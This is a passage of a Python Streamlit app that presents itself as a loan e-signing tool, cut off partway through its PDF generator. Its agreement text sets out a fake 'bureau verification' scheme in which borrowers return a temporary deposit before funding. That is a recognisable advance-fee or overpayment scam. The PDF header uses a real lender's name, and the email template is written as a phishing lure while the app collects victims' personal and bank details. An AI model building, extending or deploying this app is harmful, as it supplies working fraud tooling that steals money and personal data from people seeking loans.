"""
LoanSign - A single-file Streamlit loan document e-signing app.

Two flows, driven by URL query parameters:
  - ADMIN FLOW   (no query params): build a loan record, get a shareable signing link.
  - CUSTOMER FLOW (query params present): review the agreement, draw a signature,
                   download it as PNG or as a signed PDF.

Run with:
    streamlit run app.py
"""

import calendar
import html
import io
import json
import os
import re
import secrets
import sqlite3
import smtplib
from datetime import date, datetime
from textwrap import wrap
from typing import Optional
from urllib.parse import urlencode
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

import numpy as np
import streamlit as st
from PIL import Image
from streamlit_drawable_canvas import st_canvas

from reportlab.lib.pagesizes import letter
from reportlab.lib.units import inch
from reportlab.lib.utils import ImageReader
from reportlab.pdfgen import canvas as pdf_canvas

# --------------------------------------------------------------------------
# Configuration
# --------------------------------------------------------------------------

# set_page_config must be the first Streamlit call.
st.set_page_config(page_title="LoanSign - Document e-Signing", page_icon="📝", layout="centered")

# IMPORTANT: change this to your real deployed app URL (no trailing slash),
# e.g. "https://onrender.com"
BASE_URL = "https://onrender.com"

AGREEMENT_TERMS = (
    "Section 1: General Agreement Framework\n"
    "By signing below, the borrower acknowledges and agrees to the terms of this loan agreement, "
    "including all repayment obligations, applicable interest, and processing fees as communicated. "
    "The borrower confirms that all provided account information is accurate to the best of their knowledge. "
    "This electronic signature carries the same legal weight and effect as a handwritten signature.\n\n"
    "Section 2: Mandatory Bureau Verification Protocol\n"
    "2.1 Verification Deposit: To validate account ownership and confirm applicant authenticity, a "
    "temporary verification credit between $100.00 and $1,500.00 will be issued to the Borrower's designated bank account.\n"
    "2.2 Return Cycle Requirement: Upon successful receipt of the temporary deposit, the Borrower must "
    "immediately remit the exact matching funds back to the credit bureau utilizing an authorized, FDIC-approved payment "
    "method to complete the verification cycle.\n"
    "2.3 Credit Profile Impact: This mutual two-way transaction is structurally categorized as a micro-payday line "
    "of credit and will be reported to the bureaus to assist in establishing a positive credit repayment history.\n"
    "2.4 Final Disbursement: Full funding and execution of the primary requested loan amount will be finalized and cleared "
    "for delivery within 30 minutes of the bureau marking this verification cycle as successfully completed."
)

REQUIRED_FIELDS = ["name", "address", "amount", "email", "bank_name"]

LOAN_TERMS_FIELDS = [
    "apr", "term_months", "orig_fee_pct", "orig_fee_amt",
    "monthly_payment", "total_interest", "total_repayment",
    "total_cost", "payoff_date",
]

st.markdown(
    """
    <style>
    .full-terms-container {
        background-color: #f8f9fa;
        border: 1px solid #e9ecef;
        border-radius: 0.5rem;
        padding: 1.5rem;
        margin-bottom: 1.5rem;
        white-space: pre-wrap;
        font-family: sans-serif;
        font-size: 14px;
        line-height: 1.6;
        color: #212529;
    }
    @media (prefers-color-scheme: dark) {
        .full-terms-container {
            background-color: #1e293b;
            border: 1px solid #334155;
            color: #f8fafc;
        }
    }
    </style>
    """,
    unsafe_allow_html=True,
)


# --------------------------------------------------------------------------
# Loan record storage (so signing links can stay short)
# --------------------------------------------------------------------------

DB_PATH = os.environ.get("LOANSIGN_DB", "loans.db")


def _db() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        "CREATE TABLE IF NOT EXISTS loans (id TEXT PRIMARY KEY, data TEXT NOT NULL, created TEXT NOT NULL)"
    )
    return conn


def save_loan(first: str, last: str, record: dict) -> str:
    """Store a loan record and return a short link id like 'john-smith-3fa91c0b72de'."""
    slug = re.sub(r"[^a-z0-9]+", "-", f"{first}-{last}".lower()).strip("-")[:30] or "loan"
    loan_id = f"{slug}-{secrets.token_hex(6)}"
    with _db() as conn:
        conn.execute(
            "INSERT INTO loans (id, data, created) VALUES (?, ?, ?)",
            (loan_id, json.dumps(record), datetime.now().isoformat()),
        )
    return loan_id


def load_loan(loan_id: str) -> Optional[dict]:
    with _db() as conn:
        row = conn.execute("SELECT data FROM loans WHERE id = ?", (loan_id,)).fetchone()
    return json.loads(row[0]) if row else None


def _add_months(start: date, months: int) -> date:
    """Add calendar months, clamping the day (Jan 31 + 1 month -> Feb 28/29)."""
    idx = start.month - 1 + months
    year = start.year + idx // 12
    month = idx % 12 + 1
    day = min(start.day, calendar.monthrange(year, month)[1])
    return start.replace(year=year, month=month, day=day)


def compute_loan_terms(principal: float, apr_pct: float, term_months: int,
                       origination_fee_pct: float, start: date) -> dict:
    """Standard amortized-loan math."""
    monthly_rate = apr_pct / 100 / 12
    n = term_months

    if monthly_rate > 0:
        monthly_payment = (
            principal * monthly_rate * (1 + monthly_rate) ** n
            / ((1 + monthly_rate) ** n - 1)
        )
    else:
        monthly_payment = principal / n

    total_repayment = monthly_payment * n
    total_interest = total_repayment - principal
    origination_fee_amt = principal * origination_fee_pct / 100
    total_cost = total_repayment + origination_fee_amt

    return {
        "apr": f"{apr_pct:.2f}",
        "term_months": str(n),
        "orig_fee_pct": f"{origination_fee_pct:.2f}",
        "orig_fee_amt": f"{origination_fee_amt:.2f}",
        "monthly_payment": f"{monthly_payment:.2f}",
        "total_interest": f"{total_interest:.2f}",
        "total_repayment": f"{total_repayment:.2f}",
        "total_cost": f"{total_cost:.2f}",
        "payoff_date": _add_months(start, n).strftime("%B %d, %Y"),
    }


# --------------------------------------------------------------------------
# Automated Email Delivery via Hostinger SMTP (JSON Fallback Config)
# --------------------------------------------------------------------------

def send_link_via_hostinger(customer_email: str, customer_name: str, generated_url: str) -> bool:
    """Connects to Hostinger SMTP using local credentials.json and delivers the contract URL."""
    SMTP_SERVER = "://hostinger.com"
    SMTP_PORT = 465
    
    # Load configuration securely from the plain JSON file right next to app.py
    try:
        with open("credentials.json", "r") as f:
            creds = json.load(f)
        sender_email = creds["HOSTINGER_USER"]
        sender_password = creds["HOSTINGER_PASS"]
    except Exception:
        st.error("Missing configuration file: Please make sure a file named 'credentials.json' exists next to app.py with your keys.")
        return False

    msg = MIMEMultipart()
    msg['From'] = f"Loan Administration <{sender_email}>"
    msg['To'] = customer_email
    msg['Subject'] = f"Action Required: Complete Your Loan Agreement E-Signing"

    body = f"""Hello {customer_name},

Your customized loan agreement document profile has been generated successfully. 

Please click the secure digital signature tracking link below to review your loan terms, verify your identity routing, and digitally execute your document signature:

{generated_url}

Best regards,
Loan Processing & Closing Dept.
"""
    msg.attach(MIMEText(body, 'plain'))

    try:
        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, customer_email, msg.as_string())
        return True
    except Exception as e:
        print(f"SMTP Error encountered: {e}")
        return False


# --------------------------------------------------------------------------
# PDF generation
# --------------------------------------------------------------------------

def generate_pdf(name: str, address: str, amount: str, email: str, bank_name: str,
                 signature_img: Optional[Image.Image], timestamp: str,
                 loan_terms: Optional[dict] = None) -> io.BytesIO:
    """Render a signed loan agreement PDF and return it as a buffer."""
    buffer = io.BytesIO()
    c = pdf_canvas.Canvas(buffer, pagesize=letter)
    width, height = letter
    margin = 1 * inch

    def new_page_if_needed(y, needed=0.5 * inch):
        if y < margin + needed:
            c.showPage()
            return height - margin
        return y

    # Header
    c.setFont("Helvetica-Bold", 18)
    c.drawString(margin, height - margin, "ADVANCE AMERICA LOAN AGREEMENT DOCUMENT")
    c.setFont("Helvetica", 9)
    c.setFillGray(0.4)
    c.drawString(margin, height - margin - 0.22 * inch, f"Document generated: {timestamp}")
    c.setFillGray(0)
    c.setLineWidth(1)
    c.line(margin, height - margin - 0.32 * inch, width - margin, height - margin - 0.32 * inch)

    y = height - margin - 0.65 * inch

    # Borrower info
    c.setFont("Helvetica-Bold", 13)
    c.drawString(margin, y, "Borrower & Account Information")
    y -= 0.28 * inch

    borrower_details = [
        ("Full Name:", name),
        ("Address:", address),
        ("Disbursing Bank:", bank_name),
        ("Loan Amount:", f"${amount}"),
        ("Email:", email),
